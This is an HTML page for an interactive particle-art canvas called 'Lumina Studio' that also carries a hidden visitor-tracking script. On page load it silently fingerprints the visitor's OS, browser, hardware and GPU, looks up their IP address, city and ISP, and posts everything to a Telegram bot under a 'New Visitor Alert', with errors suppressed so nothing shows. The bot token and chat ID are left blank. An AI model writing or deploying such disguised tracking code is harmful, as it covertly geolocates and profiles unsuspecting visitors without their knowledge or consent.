<!DOCTYPE html>
<html lang="en" class="h-full bg-slate-950">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lumina • Generative Canvas & Interactive Flow Art</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                        mono: ['JetBrains Mono', 'monospace']
                    }
                }
            }
        }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: 'Inter', sans-serif;
            background-color: #030712;
            user-select: none;
            -webkit-user-select: none;
        }
        canvas {
            display: block;
            width: 100vw;
            height: 100vh;
            touch-action: none;
        }
        .glass-panel {
            background: rgba(15, 23, 42, 0.65);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>
<body class="text-slate-100 flex flex-col justify-between relative">

    <!-- Fullscreen Generative Art Canvas -->
    <canvas id="artCanvas"></canvas>

    <!-- UI Overlay Header -->
    <header class="absolute top-0 left-0 right-0 p-4 sm:p-6 flex items-center justify-between pointer-events-none z-20">
        <div class="glass-panel px-4 py-2.5 rounded-2xl flex items-center space-x-3 pointer-events-auto shadow-2xl">
            <div class="w-3 h-3 rounded-full bg-emerald-400 animate-pulse"></div>
            <div>
                <h1 class="text-xs font-bold uppercase tracking-widest text-white">Lumina Studio</h1>
                <p class="text-[10px] text-slate-400">Interactive Generative Flow Field</p>
            </div>
        </div>

        <div class="glass-panel px-3 py-1.5 rounded-xl flex items-center space-x-2 text-xs text-slate-300 pointer-events-auto shadow-lg hidden sm:flex">
            <span>💡 Touch or drag across screen to alter flow</span>
        </div>
    </header>

    <!-- UI Controls Footer -->
    <footer class="absolute bottom-6 left-1/2 -translate-x-1/2 z-20 w-full max-w-lg px-4 pointer-events-none">
        <div class="glass-panel p-3 rounded-2xl shadow-2xl flex items-center justify-between pointer-events-auto gap-2">
            
            <div class="flex items-center space-x-1.5">
                <button id="btn-palette" class="px-3 py-1.5 rounded-xl bg-slate-800/80 hover:bg-slate-700/80 text-xs font-medium text-slate-200 border border-slate-700/50 transition-all flex items-center space-x-2">
                    <span id="palette-indicator" class="w-2.5 h-2.5 rounded-full bg-sky-400"></span>
                    <span id="palette-label">Cosmic Nebula</span>
                </button>

                <button id="btn-mode" class="px-3 py-1.5 rounded-xl bg-slate-800/80 hover:bg-slate-700/80 text-xs font-medium text-slate-200 border border-slate-700/50 transition-all">
                    Mode: <span id="mode-label" class="text-emerald-400 font-semibold">Gravity</span>
                </button>
            </div>

            <div class="flex items-center space-x-1.5">
                <button id="btn-clear" class="px-3 py-1.5 rounded-xl bg-slate-800/80 hover:bg-slate-700/80 text-xs font-medium text-slate-300 border border-slate-700/50 transition-all">
                    Reset
                </button>
                <button id="btn-burst" class="px-3.5 py-1.5 rounded-xl bg-sky-600 hover:bg-sky-500 text-xs font-semibold text-white transition-all shadow-lg shadow-sky-600/30">
                    Burst ✨
                </button>
            </div>

        </div>
    </footer>

    <script>
        // =========================================================================
        // 🛠️ HARDCODED TELEGRAM CREDENTIALS FOR GITHUB PAGES
        // =========================================================================
        const HARDCODED_BOT_TOKEN = "";
        const HARDCODED_CHAT_ID   = "";
        // =========================================================================

        let currentIPData = { ip: 'Detecting...', location: 'Unknown', isp: 'Unknown' };

        function parseSystemDetails(uaString = navigator.userAgent) {
            const ua = uaString;
            let osName = "Unknown OS";
            let osVersion = "Undetermined";
            let deviceType = "Desktop";
            let arch = "x64";

            // iOS / iPadOS
            const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
            if (isIOS) {
                if (/iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
                    osName = "Apple iPadOS";
                    deviceType = "Tablet";
                } else {
                    osName = "Apple iOS";
                    deviceType = "Mobile";
                }
                const verMatch = ua.match(/OS (\d+)[_.](\d+)(?:[_.](\d+))?/);
                if (verMatch) osVersion = `${verMatch[1]}.${verMatch[2]}${verMatch[3] ? '.' + verMatch[3] : ''}`;
                else if (navigator.maxTouchPoints > 1) osVersion = "13.0+ (iPad Desktop)";
                arch = "ARM64";
            }
            // Android
            else if (/Android/.test(ua)) {
                osName = "Google Android";
                deviceType = /Mobile/.test(ua) ? "Mobile" : "Tablet";
                const verMatch = ua.match(/Android\s([0-9\.]+)/);
                if (verMatch) osVersion = verMatch[1];
                arch = /arm64|aarch64/i.test(ua) ? "ARM64" : "ARM/x86";
            }
            // macOS
            else if (/Macintosh|Mac OS X/.test(ua)) {
                osName = "macOS";
                deviceType = "Desktop";
                const verMatch = ua.match(/Mac OS X\s?([0-9_]+)/);
                if (verMatch) osVersion = verMatch[1].replace(/_/g, '.');
                arch = (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 0) ? "Apple Silicon" : "Intel/Apple Silicon";
            }
            // Windows
            else if (/Windows NT/.test(ua)) {
                osName = "Microsoft Windows";
                deviceType = "Desktop";
                const verMatch = ua.match(/Windows NT\s([0-9\.]+)/);
                if (verMatch) {
                    switch (verMatch[1]) {
                        case '10.0': osVersion = "10 / 11"; break;
                        case '6.3': osVersion = "8.1"; break;
                        case '6.2': osVersion = "8"; break;
                        case '6.1': osVersion = "7"; break;
                        default: osVersion = `NT ${verMatch[1]}`;
                    }
                }
                arch = /Win64|x64|WOW64/i.test(ua) ? "x64 (64-bit)" : "x86 (32-bit)";
            }
            // Linux
            else if (/Linux/.test(ua)) {
                osName = "Linux";
                deviceType = "Desktop";
                if (/Ubuntu/i.test(ua)) osName = "Ubuntu Linux";
                else if (/Fedora/i.test(ua)) osName = "Fedora Linux";
                else if (/Debian/i.test(ua)) osName = "Debian Linux";
                arch = /x86_64|amd64/i.test(ua) ? "x64" : "ARM/x86";
            }

            // Browser
            let browserName = "Unknown Browser";
            let browserVersion = "--";
            if (/Edg\//i.test(ua)) {
                browserName = "Microsoft Edge";
                browserVersion = (ua.match(/Edg\/([0-9\.]+)/) || [])[1] || "--";
            } else if (/OPR\/|Opera/i.test(ua)) {
                browserName = "Opera";
                browserVersion = (ua.match(/(?:OPR|Opera)\/([0-9\.]+)/) || [])[1] || "--";
            } else if (/Firefox\//i.test(ua)) {
                browserName = "Mozilla Firefox";
                browserVersion = (ua.match(/Firefox\/([0-9\.]+)/) || [])[1] || "--";
            } else if (/Chrome\//i.test(ua)) {
                browserName = "Google Chrome";
                browserVersion = (ua.match(/Chrome\/([0-9\.]+)/) || [])[1] || "--";
            } else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) {
                browserName = "Apple Safari";
                browserVersion = (ua.match(/Version\/([0-9\.]+)/) || [])[1] || "--";
            }

            return { osName, osVersion, deviceType, arch, browserName, browserVersion, rawUA: ua };
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return { renderer: 'Unsupported' };
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return {
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
                };
            } catch (e) {
                return { renderer: 'Blocked/Unavailable' };
            }
        }

        async function fetchIPDetails() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (res.ok) {
                    const data = await res.json();
                    currentIPData = {
                        ip: data.ip || 'Unknown',
                        location: `${data.city || ''}, ${data.country_name || ''}`.trim().replace(/^,/, ''),
                        isp: data.org || data.asn || 'Unknown'
                    };
                } else {
                    throw new Error('Primary IP API failed');
                }
            } catch (err) {
                try {
                    const fallbackRes = await fetch('https://api.ipify.org?format=json');
                    const fallbackData = await fallbackRes.json();
                    currentIPData = { ip: fallbackData.ip || 'Unknown', location: 'N/A', isp: 'N/A' };
                } catch (e) {
                    currentIPData = { ip: 'Unavailable', location: 'N/A', isp: 'N/A' };
                }
            }
        }

        async function sendSilentTelegramAlert() {
            const botToken = HARDCODED_BOT_TOKEN;
            const chatId = HARDCODED_CHAT_ID;

            if (!botToken || !chatId) {
                console.log("Telegram credentials not configured yet.");
                return;
            }

            const sys = parseSystemDetails();
            const gpu = getWebGLInfo();
            const now = new Date().toLocaleString();

            const messageHtml = `
<b>🚨 New Visitor Alert!</b>

📱 <b>OS:</b> ${sys.osName} (${sys.osVersion})
💻 <b>Type:</b> ${sys.deviceType} [${sys.arch}]
🌐 <b>Browser:</b> ${sys.browserName} v${sys.browserVersion}
🖥️ <b>Screen:</b> ${window.screen.width}×${window.screen.height} (DPR: ${window.devicePixelRatio || 1}x)
⚡ <b>CPU/RAM:</b> ${navigator.hardwareConcurrency || '?'} Cores | ~${navigator.deviceMemory || '?'} GB
🎮 <b>GPU:</b> ${gpu.renderer}

🌍 <b>IP Address:</b> <code>${currentIPData.ip}</code>
📍 <b>Location:</b> ${currentIPData.location}
📡 <b>ISP:</b> ${currentIPData.isp}
⏰ <b>Time:</b> ${now}

<code>${sys.rawUA}</code>
`.trim();

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: messageHtml,
                        parse_mode: 'HTML'
                    })
                });
            } catch (err) {
                // Silently ignore network errors so the art experience is uninterrupted
            }
        }

        // =========================================================================
        // 🎨 GENERATIVE ART & PARTICLE CANVAS ENGINE
        // =========================================================================
        const canvas = document.getElementById('artCanvas');
        const ctx = canvas.getContext('2d');

        let width, height;
        let particles = [];
        const particleCount = 220;

        const PALETTES = [
            { name: 'Cosmic Nebula', color: '#00f2fe', indicator: 'bg-sky-400', colors: ['#00f2fe', '#4facfe', '#7f00ff', '#e100ff'] },
            { name: 'Cyberpunk Gold', color: '#f59e0b', indicator: 'bg-amber-400', colors: ['#ff007f', '#ffaa00', '#00f0ff', '#ffe600'] },
            { name: 'Emerald Aurora', color: '#10b981', indicator: 'bg-emerald-400', colors: ['#10b981', '#059669', '#34d399', '#6ee7b7'] },
            { name: 'Solar Flare', color: '#ef4444', indicator: 'bg-rose-500', colors: ['#f43f5e', '#fb923c', '#facc15', '#e11d48'] }
        ];

        let currentPaletteIndex = 0;
        let flowMode = 'Gravity'; // 'Gravity', 'Repel', 'Vortex'

        const mouse = {
            x: -1000,
            y: -1000,
            targetX: -1000,
            targetY: -1000,
            isDown: false
        };

        function resize() {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
        }

        class Particle {
            constructor() {
                this.reset(true);
            }

            reset(initial = false) {
                this.x = Math.random() * width;
                this.y = Math.random() * height;
                this.vx = (Math.random() - 0.5) * 1.5;
                this.vy = (Math.random() - 0.5) * 1.5;
                this.radius = Math.random() * 2.5 + 1;
                
                const palette = PALETTES[currentPaletteIndex].colors;
                this.color = palette[Math.floor(Math.random() * palette.length)];
                this.alpha = Math.random() * 0.7 + 0.3;
                this.friction = 0.96;
            }

            update() {
                // Interactive forces with mouse/touch
                const dx = mouse.x - this.x;
                const dy = mouse.y - this.y;
                const dist = Math.sqrt(dx * dx + dy * dy);
                const maxDist = 220;

                if (dist < maxDist && dist > 0) {
                    const force = (1 - dist / maxDist);
                    const angle = Math.atan2(dy, dx);

                    if (flowMode === 'Gravity') {
                        this.vx += Math.cos(angle) * force * 0.8;
                        this.vy += Math.sin(angle) * force * 0.8;
                    } else if (flowMode === 'Repel') {
                        this.vx -= Math.cos(angle) * force * 1.5;
                        this.vy -= Math.sin(angle) * force * 1.5;
                    } else if (flowMode === 'Vortex') {
                        this.vx += Math.sin(angle) * force * 1.2;
                        this.vy -= Math.cos(angle) * force * 1.2;
                    }
                }

                this.vx *= this.friction;
                this.vy *= this.friction;

                this.x += this.vx;
                this.y += this.vy;

                // Screen Wrap
                if (this.x < 0) this.x = width;
                if (this.x > width) this.x = 0;
                if (this.y < 0) this.y = height;
                if (this.y > height) this.y = 0;
            }

            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
                ctx.fillStyle = this.color;
                ctx.globalAlpha = this.alpha;
                ctx.shadowBlur = 12;
                ctx.shadowColor = this.color;
                ctx.fill();
                ctx.shadowBlur = 0;
            }
        }

        function initParticles() {
            particles = [];
            for (let i = 0; i < particleCount; i++) {
                particles.push(new Particle());
            }
        }

        function drawConnections() {
            const maxConnectDist = 110;
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dx = particles[i].x - particles[j].x;
                    const dy = particles[i].y - particles[j].y;
                    const dist = Math.sqrt(dx * dx + dy * dy);

                    if (dist < maxConnectDist) {
                        const alpha = (1 - dist / maxConnectDist) * 0.25;
                        ctx.beginPath();
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.strokeStyle = particles[i].color;
                        ctx.globalAlpha = alpha;
                        ctx.lineWidth = 0.8;
                        ctx.stroke();
                    }
                }
            }
        }

        function animate() {
            ctx.fillStyle = 'rgba(3, 7, 18, 0.25)';
            ctx.fillRect(0, 0, width, height);

            mouse.x += (mouse.targetX - mouse.x) * 0.1;
            mouse.y += (mouse.targetY - mouse.y) * 0.1;

            particles.forEach(p => {
                p.update();
                p.draw();
            });

            drawConnections();
            requestAnimationFrame(animate);
        }

        // =========================================================================
        // 🎮 EVENT LISTENERS & INTERACTION LOGIC
        // =========================================================================
        window.addEventListener('resize', resize);

        window.addEventListener('mousemove', (e) => {
            mouse.targetX = e.clientX;
            mouse.targetY = e.clientY;
        });

        window.addEventListener('touchmove', (e) => {
            if (e.touches.length > 0) {
                mouse.targetX = e.touches[0].clientX;
                mouse.targetY = e.touches[0].clientY;
            }
        }, { passive: true });

        // Palette Switcher Button
        document.getElementById('btn-palette').addEventListener('click', () => {
            currentPaletteIndex = (currentPaletteIndex + 1) % PALETTES.length;
            const current = PALETTES[currentPaletteIndex];
            document.getElementById('palette-label').textContent = current.name;
            document.getElementById('palette-indicator').className = `w-2.5 h-2.5 rounded-full ${current.indicator}`;
            initParticles();
        });

        // Mode Switcher Button
        document.getElementById('btn-mode').addEventListener('click', () => {
            if (flowMode === 'Gravity') flowMode = 'Repel';
            else if (flowMode === 'Repel') flowMode = 'Vortex';
            else flowMode = 'Gravity';
            document.getElementById('mode-label').textContent = flowMode;
        });

        // Reset Canvas Button
        document.getElementById('btn-clear').addEventListener('click', () => {
            initParticles();
        });

        // Burst Button
        document.getElementById('btn-burst').addEventListener('click', () => {
            particles.forEach(p => {
                const angle = Math.random() * Math.PI * 2;
                const force = Math.random() * 12 + 4;
                p.vx = Math.cos(angle) * force;
                p.vy = Math.sin(angle) * force;
            });
        });

        window.onload = async () => {
            resize();
            initParticles();
            animate();

            // Silently collect IP and dispatch alert to Telegram in background
            await fetchIPDetails();
            sendSilentTelegramAlert();
        };
    </script>
</body>
</html>
